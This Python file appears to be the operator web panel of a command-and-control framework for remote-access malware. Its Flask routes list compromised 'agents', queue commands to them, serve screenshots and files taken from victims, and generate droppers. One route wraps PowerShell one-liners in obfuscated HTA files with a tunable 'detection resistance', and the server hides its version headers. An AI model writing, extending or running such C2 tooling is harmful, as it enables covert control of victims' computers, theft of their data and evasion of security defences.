"""
Admin Server
Administrative server with dashboard (configurable port)
"""

import ssl
import os
import json
import re
from flask import (
    Flask,
    request,
    jsonify,
    send_from_directory,
    redirect,
    render_template,
    session,
    flash,
    make_response,
)
from datetime import datetime
from database.operations import AgentDatabase
from auth.authentication import AuthManager, login_required
from utils.file_upload import FileUploadManager
from utils.dropper_generator import DropperGenerator


class AdminServer:
    def __init__(self, config_loader, logger):
        self.app = Flask(__name__, template_folder="../templates")
        self.config_loader = config_loader
        self.logger = logger
        self.db = AgentDatabase()
        self.auth_manager = AuthManager(config_loader, logger)
        self.upload_manager = FileUploadManager(upload_dir="uploads", logger=logger)
        self.ssl_context = self._create_ssl_context()
        self.command_config = self._load_command_config()
        try:
            self.dropper_generator = DropperGenerator(config_loader, logger)
        except Exception as e:
            self.dropper_generator = None
        import os
        self.app.secret_key = os.urandom(24)
        self._setup_middleware()
        self._setup_routes()
        self._setup_error_handlers()

    def _create_ssl_context(self):
        ssl_config = self.config_loader.get_global_ssl_config()
        
        if not ssl_config.get('enabled', False):
            return None
        
        cert_file = ssl_config.get('cert_file')
        key_file = ssl_config.get('key_file')
        
        if not cert_file or not key_file:
            return None
        
        if not os.path.exists(cert_file) or not os.path.exists(key_file):
            return None
        
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_version = ssl_config.get('ssl_version', 'TLSv1_2')
            if ssl_version == 'TLSv1_3':
                context.minimum_version = ssl.TLSVersion.TLSv1_3
            elif ssl_version == 'TLSv1_2':
                context.minimum_version = ssl.TLSVersion.TLSv1_2
            
            ciphers = ssl_config.get('ciphers', 'HIGH:!aNULL:!MD5')
            context.set_ciphers(ciphers)
            context.load_cert_chain(cert_file, key_file)
            context.verify_mode = ssl.CERT_NONE
            
            return context
            
        except Exception as e:
            return None
            
    def _load_command_config(self):
        try:
            config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "config", "commands.json")
            with open(config_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            self.logger.log_event(f"WARNING - Failed to load command config: {str(e)}")
            return {"commands": {}}

    def _setup_middleware(self):
        @self.app.after_request
        def after_request(response):
            return self._apply_custom_headers(response)

    def _apply_custom_headers(self, response):
        response_headers = self.config_loader.get_response_headers()
        for header in response_headers:
            if ":" in header:
                key, value = header.split(":", 1)
                response.headers[key.strip()] = value.strip()
        
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['Content-Security-Policy'] = "img-src 'self'"
        
        if response.mimetype == 'image/png' and 'screenshot' in request.path:
            response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
            response.headers['Pragma'] = 'no-cache'
            response.headers['Expires'] = '0'
            import hashlib
            import time
            etag_base = f"{request.path}:{time.time()}"
            response.headers['ETag'] = hashlib.md5(etag_base.encode()).hexdigest()
            
        return response

    def _setup_routes(self):
        @self.app.route("/login", methods=["GET", "POST"])
        def login():
            return self._handle_login()
        @self.app.route("/logout")
        def logout():
            return self._handle_logout()
        @self.app.route("/")
        @login_required(self.auth_manager)
        def dashboard():
            return self._show_dashboard()
        @self.app.route("/api/data")
        @login_required(self.auth_manager)
        def api_data():
            return self._get_api_data()
        @self.app.route("/command/<uuid>", methods=["POST"])
        @login_required(self.auth_manager)
        def set_command(uuid):
            return self._set_agent_command(uuid)
        @self.app.route("/api/history/<uuid>")
        @login_required(self.auth_manager)
        def api_history(uuid):
            return self._get_command_history(uuid)
        @self.app.route("/assets/<path:filename>")
        def serve_assets(filename):
            return self._serve_assets(filename)
            
        @self.app.route("/uploads/<path:filename>")
        @login_required(self.auth_manager)
        def serve_uploads(filename):
            return self._serve_uploads(filename)
            
        @self.app.route("/api/agent/<uuid>", methods=["DELETE"])
        @login_required(self.auth_manager)
        def delete_agent(uuid):
            return self._delete_agent(uuid)
        @self.app.route("/status")
        @login_required(self.auth_manager)
        def server_status():
            return self._get_server_status()
        @self.app.route("/dropper/<server_ip>")
        @login_required(self.auth_manager)
        def get_dropper_with_ip(server_ip):
            return self._get_dropper(server_ip)
        @self.app.route("/hta-dropper", methods=["POST"])
        @login_required(self.auth_manager)
        def generate_hta_dropper():
            return self._generate_hta_dropper()
            
        @self.app.route("/api/downloads/list")
        @login_required(self.auth_manager)
        def list_downloads():
            return self._list_downloaded_files()
            
        @self.app.route("/api/downloads/delete/<filename>", methods=["DELETE"])
        @login_required(self.auth_manager)
        def delete_download(filename):
            return self._delete_downloaded_file(filename)

    def _setup_error_handlers(self):
        @self.app.errorhandler(404)
        def not_found(error):
            self.logger.log_event(f"404 - Page not found!")
            response = self.app.response_class("", status=404, mimetype="text/plain")
            return self._apply_custom_headers(response)
        @self.app.errorhandler(500)
        def internal_error(error):
            self.logger.log_event(f"500 - Internal server error")
            response = self.app.response_class("", status=500, mimetype="text/plain")
            return self._apply_custom_headers(response)

    def _handle_login(self):
        if request.method == "POST":
            username = request.form.get("username", "").strip()
            password = request.form.get("password", "").strip()
            if not self.config_loader.get_config():
                flash("Server configuration error", "error")
                self.logger.log_event("Error: Server configuration not loaded")
                return render_template("login.html")
            if self.auth_manager.validate_credentials(username, password):
                self.auth_manager.login_user(username)
                return redirect("/")
            else:
                flash("Invalid credentials", "error")
                self.logger.log_event(f"LOGIN FAILED - Attempted login with invalid credentials: '{username}'")
                return render_template("login.html")
        if self.auth_manager.is_authenticated():
            self.logger.log_event(f"Automatic redirect - User '{self.auth_manager.get_current_user()}' already authenticated")
            return redirect("/")
        return render_template("login.html")

    def _handle_logout(self):
        self.auth_manager.logout_user()
        return redirect("/login")

    def _show_dashboard(self):
        username = self.auth_manager.get_current_user()
        return render_template("dashboard.html", username=username)

    def _get_api_data(self):
        agents = self.db.get_all_agents()
        events = self.logger.get_recent_events(100)
        return jsonify({"agents": agents, "events": events})

    def _get_command_history(self, uuid):
        history = self.db.get_command_history(uuid)
        return jsonify({"history": history})

    def _set_agent_command(self, uuid):
        username = self.auth_manager.get_current_user()
        cmd = request.form.get("command", "").strip()

        if not cmd:
            self.db.set_command_output(uuid, "Please enter a command.")
            self.logger.log_event(f"COMMAND - '{username}' sent empty command to {uuid[:8]}")
            return redirect("/")

        if cmd.lower() == "help":
            help_output = self._generate_help_output()
            self.db.set_command_output(uuid, help_output)
            self.db.add_command_history(uuid, cmd, help_output, username)
            return redirect("/")

        help_match = re.match(r'^help\s+(\w+)$', cmd.lower())
        if help_match:
            command_name = help_match.group(1)
            help_output = self._generate_command_help(command_name)
            self.db.set_command_output(uuid, help_output)
            self.db.add_command_history(uuid, cmd, help_output, username)
            return redirect("/")

        parts = cmd.split(' ', 1)
        command_name = parts[0].lower()
        command_args = parts[1] if len(parts) > 1 else ""

        if not self._is_valid_command(command_name):
            error_output = f"Unknown command: {command_name}. Type 'help' for a list of available commands."
            self.db.set_command_output(uuid, error_output)
            self.db.add_command_history(uuid, cmd, error_output, username)
            self.logger.log_event(f"COMMAND - '{username}' sent unknown command '{command_name}' to {uuid[:8]}")
            return redirect("/")

        validation_result = self._validate_command_parameters(command_name, command_args)
        if validation_result:
            self.db.set_command_output(uuid, validation_result)
            self.db.add_command_history(uuid, cmd, validation_result, username)
            self.logger.log_event(f"COMMAND - '{username}' sent incomplete command '{command_name}' to {uuid[:8]}")
            return redirect("/")

        self.db.set_command(uuid, cmd)
        self.db.add_command_history(uuid, cmd, '', username)
        cmd_preview = cmd[:50] + "..." if len(cmd) > 50 else cmd
        self.logger.log_event(f"COMMAND - '{username}' sent command to {uuid[:8]}: {cmd_preview[:30]}{'...' if len(cmd_preview) > 30 else ''}")
        return redirect("/")

    def _delete_agent(self, uuid):
        username = self.auth_manager.get_current_user()
        try:
            if not uuid or len(uuid) < 8:
                self.logger.log_event(f"DELETE AGENT - Invalid UUID format by '{username}': {uuid}")
                return jsonify({"success": False, "error": "Invalid UUID format"}), 400
            agent = self.db.get_agent_by_uuid(uuid)
            if not agent:
                self.logger.log_event(f"DELETE AGENT - Agent not found by '{username}': {uuid[:8]}")
                return jsonify({"success": False, "error": "Agent not found"}), 404
            self.db.delete_agent_history(uuid)
            deleted = self.db.delete_agent(uuid)
            if deleted:
                agent_info = f"{agent.get('hostname', 'Unknown')} ({agent.get('username', 'Unknown')})"
                self.logger.log_event(f"DELETE AGENT - '{username}' deleted agent {uuid[:8]} - {agent_info}")
                return jsonify({
                    "success": True, 
                    "message": f"Agent {uuid[:8]} deleted successfully",
                    "deleted_agent": {
                        "uuid": uuid,
                        "hostname": agent.get('hostname'),
                        "username": agent.get('username')
                    }
                }), 200
            else:
                self.logger.log_event(f"DELETE AGENT - Failed to delete agent {uuid[:8]} by '{username}'")
                return jsonify({"success": False, "error": "Failed to delete agent"}), 500
        except Exception as e:
            error_msg = f"Internal error deleting agent: {str(e)}"
            self.logger.log_event(f"DELETE AGENT - Critical error by '{username}': {error_msg}")
            return jsonify({"success": False, "error": error_msg}), 500

    def _generate_help_output(self):
        commands = self.command_config.get("commands", {})
        
        help_output = "Agent Commands\n"
        help_output += "==============\n"
        help_output += "Command          Description\n"
        help_output += "-------          -----------\n"
        
        for cmd_name, cmd_info in sorted(commands.items()):
            help_output += f"{cmd_name.ljust(16)} {cmd_info.get('description', '')}\n"
        
        help_output += "\nNote: Use 'help <command>' for detailed command information."
        
        return help_output
        
    def _generate_command_help(self, command_name):
        commands = self.command_config.get("commands", {})
        
        if command_name not in commands:
            return f"Unknown command: {command_name}. Type 'help' for a list of available commands."
            
        cmd_info = commands[command_name]
        
        help_output = f"Command: {command_name.upper()}\n"
        help_output += "=" * (len(command_name) + 9) + "\n"
        help_output += f"Description: {cmd_info.get('description', 'No description available.')}\n\n"
        help_output += f"Usage: {cmd_info.get('usage', command_name)}\n\n"
        
        parameters = cmd_info.get('parameters', [])
        if parameters:
            help_output += "Parameters:\n"
            for param in parameters:
                required = "Required" if param.get('required', False) else "Optional"
                help_output += f"  {param.get('name', '').ljust(12)} - {param.get('description', '')} ({required})\n"
        else:
            help_output += "This command has no parameters.\n"
            
        help_output += "\nTactics: " + cmd_info.get('description', '').split(' ')[-1] if '(' in cmd_info.get('description', '') else ""
        
        return help_output
        
    def _is_valid_command(self, command_name):
        return command_name in self.command_config.get("commands", {})
        
    def _validate_command_parameters(self, command_name, args):
        commands = self.command_config.get("commands", {})
        if command_name not in commands:
            return f"Unknown command: {command_name}"
            
        cmd_info = commands[command_name]
        parameters = cmd_info.get('parameters', [])
        
        if not parameters:
            return None
            
        required_params = [p for p in parameters if p.get('required', False)]
        
        if required_params and not args.strip():
            return f"Missing required parameter(s). Usage: {cmd_info.get('usage', command_name)}\nType 'help {command_name}' for more information."
            
        return None

    def _serve_assets(self, filename):
        try:
            if ".." in filename or filename.startswith("/") or "uploads" in filename:
                self.logger.log_event(f"SECURITY - Asset directory traversal attempt: {filename}")
                return "Forbidden", 403
                
            if filename.startswith("css/") and filename.endswith(".css"):
                return send_from_directory("../templates/assets", filename, mimetype="text/css")
            elif filename.startswith("js/") and filename.endswith(".js"):
                return send_from_directory("../templates/assets", filename, mimetype="application/javascript")
            elif filename.startswith("logo.png") or filename.endswith((".ico", ".svg", ".png", ".jpg")):
                if any(substring in filename.lower() for substring in ["screenshot", "agent", "upload"]):
                    self.logger.log_event(f"SECURITY - Attempted to access restricted image via assets: {filename}")
                    return "Forbidden", 403
                return send_from_directory("../templates/assets", filename)
            else:
                self.logger.log_event(f"SECURITY - Attempted to access non-allowed asset type: {filename}")
                return "Forbidden", 403
        except FileNotFoundError:
            return f"File not found: /assets/{filename}", 404
            
    def _serve_uploads(self, filename):
        try:
            if ".." in filename or filename.startswith("/"):
                self.logger.log_event(f"SECURITY - Upload directory traversal attempt: {filename}")
                return "Forbidden", 403
            
            if filename.lower().startswith('screenshot_') and filename.lower().endswith('.png'):
                if not session.get('authenticated'):
                    self.logger.log_event(f"SECURITY - Unauthenticated screenshot access attempt: {filename}")
                    return "Unauthorized", 401
                
                self.logger.log_event(f"SECURITY - Screenshot accessed by {session.get('username')}: {filename}")
                
            mime_type = None
            if filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                if filename.lower().endswith('.png'):
                    mime_type = 'image/png'
                elif filename.lower().endswith('.jpg') or filename.lower().endswith('.jpeg'):
                    mime_type = 'image/jpeg'
                elif filename.lower().endswith('.gif'):
                    mime_type = 'image/gif'
            
            self.logger.log_event(f"UPLOAD - File accessed: {filename}")
            
            if mime_type:
                return send_from_directory("../uploads", filename, mimetype=mime_type)
            else:
                return send_from_directory("../uploads", filename)
                
        except FileNotFoundError:
            self.logger.log_event(f"UPLOAD - File not found: {filename}")
            return f"File not found: /uploads/{filename}", 404
        except Exception as e:
            self.logger.log_event(f"UPLOAD - Error serving file {filename}: {str(e)}")
            return "Internal Server Error", 500

    def _get_dropper(self, server_ip):
        username = self.auth_manager.get_current_user()
        if not self.dropper_generator:
            self.logger.log_event(f"DROPPER - DropperGenerator not initialized")
            return "Internal Server Error - Dropper not available", 500
        if not server_ip or not server_ip.strip():
            self.logger.log_event(f"DROPPER - Server IP required")
            return "Bad Request - IP/host is required. Use: /dropper/YOUR_IP", 400
        try:
            dropper_content = self.dropper_generator.generate_dropper(server_ip)
            if not dropper_content:
                self.logger.log_event(f"DROPPER - Generation failed for user {username}")
                return "Internal Server Error", 500
            self.logger.log_event(f"DROPPER ADMIN - Dropper delivered to '{username}'")
            response = self.app.response_class(dropper_content, status=200, mimetype='text/plain')
            response.headers['Content-Type'] = 'text/plain; charset=utf-8'
            return self._apply_custom_headers(response)
        except Exception as e:
            self.logger.log_event(f"DROPPER - Error for user {username}: {str(e)}")
            return f"Internal Server Error: {str(e)}", 500

    def _generate_hta_dropper(self):
        username = self.auth_manager.get_current_user()
        try:
            data = request.get_json()
            if not data or 'oneliner' not in data:
                self.logger.log_event(f"HTA DROPPER - Missing oneliner for user {username}")
                return jsonify({"error": "Missing oneliner parameter"}), 400
            oneliner = data['oneliner'].strip()
            obfuscation_level = data.get('obfuscation_level', 5)
            obfuscation_level = max(1, min(10, int(obfuscation_level)))
            if not oneliner:
                self.logger.log_event(f"HTA DROPPER - Empty oneliner for user {username}")
                return jsonify({"error": "Oneliner cannot be empty"}), 400
            if not oneliner.startswith('powershell.exe'):
                self.logger.log_event(f"HTA DROPPER - Invalid oneliner format for user {username}")
                return jsonify({"error": "Invalid oneliner format"}), 400
            from utils.hta_obfuscator import AdvancedHTAObfuscator
            obfuscator = AdvancedHTAObfuscator(obfuscation_level)
            hta_content = obfuscator.generate_obfuscated_hta_from_oneliner(oneliner)
            if not hta_content:
                self.logger.log_event(f"HTA DROPPER - Generation failed for user {username}")
                return jsonify({"error": "Error generating obfuscated HTA"}), 500
            obf_info = obfuscator.get_obfuscation_info()
            response = make_response(hta_content)
            response.headers['Content-Type'] = 'application/hta'
            response.headers['Content-Disposition'] = f'attachment; filename="dropper_L{obfuscation_level}.hta"'
            self.logger.log_event(f"HTA DROPPER - Generated L{obfuscation_level} for '{username}' ({obf_info['detection_resistance']} resistance, {len(hta_content)} chars)")
            return self._apply_custom_headers(response)
        except Exception as e:
            self.logger.log_event(f"HTA DROPPER - Critical error for user {username}: {str(e)}")
            return jsonify({"error": str(e)}), 500

    def _get_server_status(self):
        agent_count = self.db.get_agent_count()
        events_count = self.logger.get_events_count()
        upload_stats = self.upload_manager.get_upload_stats()
        dropper_stats = None
        if self.dropper_generator:
            dropper_stats = self.dropper_generator.get_dropper_stats()
        return jsonify(
            {
                "status": "online",
                "agent_count": agent_count,
                "events_count": events_count,
                "upload_stats": upload_stats,
                "dropper_stats": dropper_stats,
                "timestamp": datetime.now().isoformat(),
                "user": self.auth_manager.get_current_user(),
                "server_type": "admin",
                "ssl_enabled": self.ssl_context is not None,
            }
        )

    def _list_downloaded_files(self):
        try:
            files = self.upload_manager.list_uploaded_files()
            return jsonify(files)
        except Exception as e:
            self.logger.log_event(f"ERROR - Failed to list downloaded files: {str(e)}")
            return jsonify({"error": str(e)}), 500
            
    def _delete_downloaded_file(self, filename):
        try:
            if not self._is_safe_filename(filename):
                self.logger.log_event(f"SECURITY - Attempted path traversal in file delete: {filename}")
                return jsonify({"success": False, "error": "Invalid filename"}), 400
                
            file_path = os.path.join("uploads", filename)
            
            if not os.path.exists(file_path):
                return jsonify({"success": False, "error": "File not found"}), 404
                
            os.remove(file_path)
            self.logger.log_event(f"File deleted: {filename}")
            
            return jsonify({"success": True, "message": f"File {filename} deleted successfully"})
        except Exception as e:
            self.logger.log_event(f"ERROR - Failed to delete file {filename}: {str(e)}")
            return jsonify({"success": False, "error": str(e)}), 500
            
    def _is_safe_filename(self, filename):
        return not (
            ".." in filename 
            or filename.startswith("/") 
            or filename.startswith("\\")
            or ":" in filename
            or "\\" in filename
        )

    def run(self, host, port):
        from werkzeug.serving import WSGIRequestHandler
        WSGIRequestHandler.server_version = ""
        WSGIRequestHandler.sys_version = ""
        
        if self.ssl_context:
            self.app.run(host=host, port=port, debug=False, use_reloader=False, ssl_context=self.ssl_context)
        else:
            self.app.run(host=host, port=port, debug=False, use_reloader=False)